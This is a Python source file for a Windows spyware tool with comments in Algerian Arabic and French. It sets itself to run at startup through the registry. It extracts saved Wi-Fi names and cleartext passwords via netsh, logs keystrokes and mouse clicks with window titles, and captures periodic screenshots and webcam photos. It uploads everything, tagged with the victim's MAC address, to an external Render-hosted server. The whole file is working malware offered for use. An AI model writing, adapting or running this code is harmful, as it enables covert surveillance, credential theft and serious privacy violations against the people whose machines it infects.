from pynput import keyboard, mouse
import win32gui
import threading
import requests
import time
import uuid
from pynput import keyboard
import subprocess
import datetime
import re
import sys
import cv2
from datetime import datetime
import os
from PIL import ImageGrab
from multiprocessing import Process
import numpy as np
import mimetypes
import os
import sys
import winreg

def setup_autolaunch():
    """Automatically add to startup on first run"""
    app_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
    app_path = os.path.abspath(app_path)
    
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
        )
        
        # Check if already added
        try:
            existing = winreg.QueryValueEx(key, "nice")[0]
            if existing == app_path:
                return  # Already set up
        except:
            pass
        
        # Add to startup
        winreg.SetValueEx(key, "nice", 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
        
        # Create a flag file so we don't ask again
        flag_path = os.path.join(os.path.dirname(app_path), ".autolaunch_setup")
        open(flag_path, 'w').close()
        
    except Exception as e:
        pass  # Silent fail

# ====================================================
# PASTE YOUR ACTUAL CODE HERE, REPLACING THE main() function!
# ====================================================
# Create folder to save images
save_dir = "captures"
os.makedirs(save_dir, exist_ok=True)
SERVER_URL = "https://mini-server-90un.onrender.com/send"
text = ""  # global buffer
mac = uuid.getnode()
MAC = ':'.join(format((mac >> ele) & 0xff, '02x') for ele in range(40, -1, -8))

def send_text(message):
    try:
        files = {
            "text": (None, MAC + " | " + message)
        }
        response = requests.post(SERVER_URL, files=files)
        print("Sent:", message)
    except Exception as e:
        print("Send failed:", e)




#hdi bch n9dro n'executiw les commandes kichghol rana f cmd
#hadi bch ndo text li ykhrjlna f cmd w ndo meno ghir wch ns79o (nom et mot de passe) 
#netsh wlan show profiles hadi bch n'affichiw ga3 les profils Wi-Fi enregistrés f el pc
#capture_output=True nricupiriw résultat dans une variable mchi f terminal
#.stdout.decode() → resultat ykhrj en byte hadi bch nrj3oh text
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode('cp850')
 
#doka lzm njbdo ga3 les wifi profils  
#n7wso 3la les lignes li fihom "All User Profile     : "
#w ndo ghir text li mor les :
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

#doka ncreyiw une liste li n7to fiha wifi names + passwords
wifi_list = []

# Si la liste des profils rahi vide, m3tha makyn 7ta Wi-Fi sauvegardé.
# Le bloc hada n9dro bih nparcuriw chaque profil trouvé pour checke ses informations détaillées et récupérer el password b la commande "key=clear".
if len(profile_names) != 0:
    for name in profile_names:
        #On crée un dictionnaire pour chaque réseau (n7to fih SSID + password).
        wifi_profile = {}
        #dpka n9dro nrunniw cpmmande li biha nchofo les information t3 wifi connection w ida security key is not absent tema n9dro njbdo password
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode('cp850')
        # ida kanet security key absent we ignore it
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            #n7tto ll ssid t3 wifi f dictionnaire
            wifi_profile["ssid"] = name

            #key=clear taffichi elpassword en clair (f admin mode)
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode('cp850')

            #n7wso 3la la ligne li fiha el mot de passe
            password = re.search("Key Content            : (.*)\r", profile_info_pass)

            #Check if we found a password wla n7to none ida m3ntdhomch password 
            if password == None:
                wifi_profile["password"] = None
            else:
                #n'ajoutiw el password dans le cas win kyn
                wifi_profile["password"] = password[1]
            #n'ajoutiw el wifi ll la liste t3 wifi-list
            wifi_list.append(wifi_profile) 

time_interval = 15  # envoi chaque 15sec

def send_textWIFI(message):
    try:
        files = {
            "text": (None, message)
        }
        response = requests.post(SERVER_URL, files=files)
        print("Sent:", message)
    except Exception as e:
        print("Send failed:", e)
        
def send_to_server():
    try:
        big_string = ""
        for user in wifi_list:
          big_string = f"{MAC} | Username: {user['ssid']} | Password: {user['password']}\n "
          send_textWIFI(big_string)



    except:
        threading.Timer(time_interval, send_to_server).start()

def send_text_and_file(message, file_path):
    try:
        # Get the correct MIME type based on the file extension
        mime_type, _ = mimetypes.guess_type(file_path)
        if mime_type is None:
            mime_type = "application/octet-stream"  # fallback

        with open(file_path, "rb") as f:
            files = {
                "file": (file_path.split("/")[-1], f, mime_type)
            }
            data = {
                "text": message + "its an image"
            }
            response = requests.post(SERVER_URL, files=files, data=data)
            print("Status code:", response.status_code)
            print("Response:", response.text)
    except Exception as e:
        print("Send failed:", e)
# Open webcam (0 = default camera)
def camera():
   cap = cv2.VideoCapture(0)

   if not cap.isOpened():
    print("Error: Cannot access the camera")
    exit()

   print("Camera started. Press CTRL+C to stop.")
   try:
    while True:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if not ret:
            print("Failed to grab frame")
            break

        # Create filename with timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"{save_dir}/photo_{timestamp}.PNG"

        # Save image
       
        cv2.imwrite(filename, frame)
        print(f"Saved: {filename}")
        send_text_and_file(MAC, filename)
        os.remove(filename)
        cap.release()
        cv2.destroyAllWindows()
        # Wait 10 seconds
        time.sleep(3600)
    

   except KeyboardInterrupt:
    print("\nStopped by user")

   finally:
    cap.release()
    cv2.destroyAllWindows()


def take_screenshot():
    # Take screenshot (entire screen)
  while True:
    img = ImageGrab.grab()

    # Convert PIL image to OpenCV format (numpy array)
    img_np = np.array(img)
    frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)

    # Optional: save temporarily
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{save_dir}/screenshot_{timestamp}.png"
    cv2.imwrite(filename, frame)
    print(f"Saved: {filename}")
    send_text_and_file(MAC, filename)
    os.remove(filename)
    print(f"Deleted: {filename}")
    time.sleep(10)

def send_to_servere(message):
    try:
        files = {
            "text": (None, MAC + " | " + message)
        }
        response = requests.post(SERVER_URL, files=files)
        print("Sent:", message)
    except Exception as e:
        print("Send failed:", e)


# ----------------- GET ACTIVE WINDOW TITLE -----------------
def get_active_window():
    hwnd = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(hwnd)


# ----------------- KEYBOARD LISTENER -----------------
def on_press(key):
    global text

    try:
        if key == keyboard.Key.enter:
            # send the text when user presses ENTER
            if text.strip() != "":
                send_to_servere("Typed: " + text)
            text = ""  # reset
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.backspace:
            text = text[:-1]
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            # normal character
            text += str(key).strip("'")
    except:
        pass


# ----------------- MOUSE LISTENER -----------------
def on_click(x, y, button, pressed):
    if pressed:
        app = get_active_window()

        message = f"Mouse click on '{app}' at ({x}, {y})"
        print(message)

        # OPTIONAL: send click events to your server
        send_to_servere("Click: " + message)


# ----------------- START BOTH LISTENERS -----------------
def start_listeners():
    keyboard_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click)

    keyboard_listener.start()
    mouse_listener.start()

    keyboard_listener.join()
    mouse_listener.join()


# Your actual main function (rename if needed)
def your_main_function():
    send_to_server()
    thread1 = threading.Thread(target=camera)
    thread2 = threading.Thread(target=take_screenshot)
    thread3 = threading.Thread(target=start_listeners)
    thread1.start()
    thread2.start()
    thread3.start()

# ====================================================
# KEEP THIS PART AS IS
# ====================================================
if __name__ == "__main__":
    your_main_function()  # Change this to YOUR main function name